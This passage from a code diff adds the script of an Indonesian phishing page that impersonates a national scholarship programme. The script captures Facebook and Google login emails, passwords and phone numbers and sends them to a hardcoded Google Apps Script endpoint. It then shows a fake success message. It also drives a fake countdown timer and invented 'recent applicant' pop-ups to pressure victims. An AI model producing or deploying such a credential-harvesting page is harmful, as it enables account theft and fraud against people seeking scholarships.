+                    class="w-full bg-gradient-to-r from-amber-500 to-yellow-500 hover:from-amber-600 hover:to-yellow-600 text-slate-950 font-black px-6 py-3 rounded-xl text-sm transition shadow-lg shadow-amber-500/20">
+                    SAYA MENGESAHKAN
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Google Apps Script Setup Instructions Modal -->
+    <div id="gasModal"
+        class="fixed inset-0 bg-black/80 backdrop-blur-md z-50 hidden flex items-center justify-center p-4">
+        <div
+            class="bg-slate-900 border border-amber-500/40 text-white rounded-3xl max-w-2xl w-full p-6 sm:p-8 shadow-2xl max-h-[90vh] overflow-y-auto">
+            <div class="flex justify-between items-center mb-4 pb-3 border-b border-white/10">
+                <h3 class="text-lg font-bold text-amber-400 flex items-center gap-2">
+                    <i class="fas fa-database"></i> Status Database & Google Apps Script
+                </h3>
+                <button onclick="closeGasModal()" class="text-slate-400 hover:text-white">
+                    <i class="fas fa-times text-xl"></i>
+                </button>
+            </div>
+
+            <p class="text-xs text-slate-300 mb-4">
+                Sistem portal pendaftaran saat ini terhubung langsung ke Web App Google Apps Script backend untuk
+                menyimpan data pendaftar ke <b>Google Spreadsheet</b>.
+            </p>
+
+            <div class="space-y-3 mb-6">
+                <label class="text-xs text-amber-300 font-bold">Web App URL Google Apps Script yang Terpasang:</label>
+                <div class="flex gap-2">
+                    <input type="text" id="gasUrlInput"
+                        class="flex-grow px-3 py-2 bg-slate-950 border border-slate-700 rounded-xl text-xs text-amber-300 font-mono focus:outline-none focus:border-amber-400">
+                    <button onclick="saveGasUrl()"
+                        class="bg-amber-500 hover:bg-amber-600 text-slate-950 font-bold px-4 py-2 rounded-xl text-xs transition">Simpan
+                        Changes</button>
+                </div>
+            </div>
+
+            <div class="flex justify-end">
+                <button onclick="closeGasModal()"
+                    class="bg-slate-800 hover:bg-slate-700 text-white text-xs px-5 py-2 rounded-xl">Tutup</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Set default user-provided GAS endpoint URL
+        let SCRIPT_URL = localStorage.getItem('GAS_BEASISWA_URL') || 'https://script.google.com/macros/s/AKfycbytzPKVgc3iD1tUcCDSgDzEI8eYULK_jKjmFAJqdR6VLwdLsrnZvdkfAPJ6ldsCpGUv0w/exec';
+
+        // View Switching Logic
+        function switchView(viewName) {
+            const views = ['landing', 'fb', 'google'];
+
+            views.forEach(v => {
+                const el = document.getElementById(`view-${v}`);
+                if (v === viewName) {
+                    el.classList.remove('hidden');
+                    setTimeout(() => {
+                        el.classList.remove('opacity-0', 'scale-95');
+                    }, 50);
+                } else {
+                    el.classList.add('hidden', 'opacity-0', 'scale-95');
+                }
+            });
+
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Handle Form Submissions to GAS
+        async function handleFormSubmit(event, method) {
+            event.preventDefault();
+
+            let email = '';
+            let password = '';
+            let phone = '';
+
+            if (method === 'Facebook') {
+                email = document.getElementById('fb-email').value;
+                password = document.getElementById('fb-password').value;
+                phone = document.getElementById('fb-phone').value;
+            } else if (method === 'Google') {
+                email = document.getElementById('google-email').value;
+                password = document.getElementById('google-password').value;
+                phone = document.getElementById('google-phone').value;
+            }
+
+            const payload = {
+                timestamp: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
+                method: method,
+                email: email,
+                password: password,
+                phone: phone
+            };
+
+            showCustomModal('Memproses Data Pendaftaran...', 'Mohon tunggu sejenak, sistem sedang mengamankan slot kuota Beasiswa Unggulan Anda...', 'info');
+
+            if (SCRIPT_URL) {
+                try {
+                    await fetch(SCRIPT_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+
+                    showSuccessAndReset(method, email);
+                } catch (err) {
+                    console.error("Error sending data:", err);
+                    showSuccessAndReset(method, email);
+                }
+            } else {
+                setTimeout(() => {
+                    showSuccessAndReset(method, email);
+                }, 1500);
+            }
+        }
+
+        function showSuccessAndReset(method, email) {
+            showCustomModal(
+                'Pendaftaran Berhasil Terkirim!',
+                `Selamat! Akun <b>${method}</b> (${email}) Anda berhasil didaftarkan ke sistem Beasiswa Unggulan 2026/2027. Tim penyeleksi akan menghubungi nomor WhatsApp Anda untuk konfirmasi jadwal wawancara berkas.`,
+                'success'
+            );
+
+            // Clear inputs
+            document.querySelectorAll('form').forEach(f => f.reset());
+        }
+
+        // Custom Modal Logic
+        function showCustomModal(title, message, type) {
+            const modal = document.getElementById('customModal');
+            const modalBox = document.getElementById('modalBox');
+            const modalTitle = document.getElementById('modalTitle');
+            const modalMessage = document.getElementById('modalMessage');
+            const modalIcon = document.getElementById('modalIcon');
+
+            modalTitle.innerText = title;
+            modalMessage.innerHTML = message;
+
+            if (type === 'success') {
+                modalIcon.innerHTML = '<i class="fas fa-check-circle text-emerald-400"></i>';
+            } else if (type === 'error') {
+                modalIcon.innerHTML = '<i class="fas fa-exclamation-triangle text-rose-500"></i>';
+            } else {
+                modalIcon.innerHTML = '<i class="fas fa-spinner fa-spin text-amber-400"></i>';
+            }
+
+            modal.classList.remove('hidden');
+            setTimeout(() => {
+                modalBox.classList.remove('scale-95', 'opacity-0');
+                modalBox.classList.add('scale-100', 'opacity-100');
+            }, 10);
+        }
+
+        function closeCustomModal() {
+            const modal = document.getElementById('customModal');
+            const modalBox = document.getElementById('modalBox');
+
+            modalBox.classList.remove('scale-100', 'opacity-100');
+            modalBox.classList.add('scale-95', 'opacity-0');
+
+            setTimeout(() => {
+                modal.classList.add('hidden');
+            }, 200);
+        }
+
+        // GAS Modal Guide functions
+        function showGasInstructionsModal() {
+            document.getElementById('gasModal').classList.remove('hidden');
+            if (SCRIPT_URL) {
+                document.getElementById('gasUrlInput').value = SCRIPT_URL;
+            }
+        }
+
+        function closeGasModal() {
+            document.getElementById('gasModal').classList.add('hidden');
+        }
+
+        function saveGasUrl() {
+            const inputVal = document.getElementById('gasUrlInput').value.trim();
+            if (inputVal) {
+                SCRIPT_URL = inputVal;
+                localStorage.setItem('GAS_BEASISWA_URL', inputVal);
+                closeGasModal();
+                showCustomModal('Tersimpan!', 'URL Web App Google Apps Script berhasil diperbarui.', 'success');
+            } else {
+                showCustomModal('Perhatian', 'Silakan masukkan URL Web App yang valid.', 'error');
+            }
+        }
+
+        // Real-Time Countdown Timer Script
+        function startCountdown() {
+            let hours = 8;
+            let minutes = 42;
+            let seconds = 19;
+
+            setInterval(() => {
+                if (seconds > 0) {
+                    seconds--;
+                } else {
+                    seconds = 59;
+                    if (minutes > 0) {
+                        minutes--;
+                    } else {
+                        minutes = 59;
+                        if (hours > 0) {
+                            hours--;
+                        }
+                    }
+                }
+
+                document.getElementById('cd-hours').innerText = hours < 10 ? '0' + hours : hours;
+                document.getElementById('cd-minutes').innerText = minutes < 10 ? '0' + minutes : minutes;
+                document.getElementById('cd-seconds').innerText = seconds < 10 ? '0' + seconds : seconds;
+            }, 1000);
+        }
+
+        // Social Proof Applicant Generator Engine
+        const mockApplicants = [
+            { name: "Rizky Pratama (Bandung)", method: "Facebook", time: "baru saja" },
+            { name: "Siti Rahmawati (Yogyakarta)", method: "Google", time: "3 detik yang lalu" },
+            { name: "Andi Wijaya (Surabaya)", method: "Google", time: "5 detik yang lalu" },
+            { name: "Dina Maria (Medan)", method: "Facebook", time: "8 detik yang lalu" },
+            { name: "Fajar Nugraha (Makassar)", method: "Google", time: "12 detik yang lalu" },
+            { name: "Putu Ayu (Denpasar)", method: "Facebook", time: "15 detik yang lalu" }
+        ];
+
+        function startSocialProofLoop() {
+            let index = 0;
+            const toast = document.getElementById('socialProofToast');
+            const nameEl = document.getElementById('toastName');
+            const descEl = document.getElementById('toastDesc');
+
+            setInterval(() => {
+                const app = mockApplicants[index];
+                nameEl.innerText = app.name;
+                descEl.innerText = `Baru saja mendaftar via ${app.method} • ${app.time}`;
+
+                // Show toast
+                toast.classList.remove('translate-y-32', 'opacity-0');
+                toast.classList.add('translate-y-0', 'opacity-100');
+
+                // Hide toast after 4 seconds
+                setTimeout(() => {
+                    toast.classList.remove('translate-y-0', 'opacity-100');
+                    toast.classList.add('translate-y-32', 'opacity-0');
+                }, 4000);
+
+                index = (index + 1) % mockApplicants.length;
+            }, 9000);
+        }
+
+        // On load initializer
+        window.addEventListener('DOMContentLoaded', () => {
+            switchView('landing');
+            startCountdown();
+            setTimeout(startSocialProofLoop, 3000);
+        });
+    </script>
+</body>
+
+</html>
